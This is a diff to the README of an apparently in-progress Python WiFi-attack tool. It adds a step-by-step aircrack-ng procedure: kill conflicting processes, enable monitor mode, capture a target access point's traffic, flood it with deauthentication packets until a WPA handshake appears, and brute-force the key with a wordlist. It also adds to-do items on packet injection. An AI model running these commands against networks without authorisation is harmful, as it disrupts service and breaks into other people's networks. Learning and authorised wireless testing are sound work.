@@ -3,5 +3,22 @@
 - First option is to display all the available interfaces. In order to do this, master.py calls **listInterfaces** function which in turn calls DetectInterface.py with its execIW() function. The execIW() function runs ``ip link show`` to list all the available interfaces and stores the output in an ephemeral file **interfaces.txt**. **listInterfaces()** then does some string manipulation to carve out the interface names and deletes the **interfaces.txt** file. It also returns the interfaces list to master.py which is then displayed.
 
 
+
+## Procedure[David Bombal video]
+1. Select a Wireless Adapter that supports monitor mode and packet injection
+2. Choose a WiFi network or AP to attack
+3. Run `sudo airmon-ng check kill` to kill any conflicting processes
+4. Run `sudo airmon-ng start {interface}` to activate Monitor Mode
+5. Run `sudo airodump-ng {interface}mon` to get the AP's MAC address and channel
+6. In one window, `sudo airodump-ng -w {output file} -c {channel} --bssid {MAC of AP} {interface}mon`.This will keep outputting packets as a pcap file.
+7. In second window, `sudo aireplay-ng --deauth 0 -a {MAC of AP} {interface}mon`. This performs the deauth.
+8. As soon as "WPA handhsake" appears in the second window, stop the outputting of packets in the first window.
+9. Put interface back into managed mode
+10. Run `aircrack-ng hack-01.cap -w {wordlist}` to brute force the key data present in hack-01.cap output file.
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## Errors to fix
 1. If interface is already in monitor mode, do not return "Interface does not support monitor mode". Instead deactivate it, then resume normal operation
+2. Check for packet injection on the wireless interface as well
+3. Weird issues persisting in scanning. Try to kill conflicting processes
+4. Unpredictable naming conventions of the Interfaces is problematic
